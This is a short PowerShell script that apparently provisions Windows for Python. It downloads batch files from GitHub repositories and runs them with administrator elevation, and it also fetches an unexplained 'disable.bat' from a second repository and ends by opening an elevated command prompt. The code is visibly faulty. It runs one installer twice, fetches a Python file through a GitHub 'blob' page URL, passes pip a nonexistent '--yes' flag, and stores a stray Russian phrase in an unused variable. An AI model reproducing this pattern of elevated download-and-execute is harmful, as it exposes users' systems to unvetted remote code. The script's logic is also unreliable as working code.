$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
$info = "тему урока предлагаю объявить" 
$installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
$batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat" 
$batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
$installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
$installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"

$batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
$batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"

$pythonScriptUrl = "https://github.com/FanAPIpipa/pipa/blob/main/animatetext.py"
$pythonScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "animatetyping.py"

Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
Invoke-WebRequest -Uri $pythonScriptUrl -OutFile $pythonScriptPath
Start-Process -FilePath "cmd.exe" -ArgumentList "/c pip install --yes pyfiglet" -Verb RunAs -Wait
Add-Type -AssemblyName PresentationCore
[Windows.Clipboard]::SetText("$PythonScriptPath")
Start-Process -FilePath "cmd.exe" -ArgumentList "/K" -Verb RunAs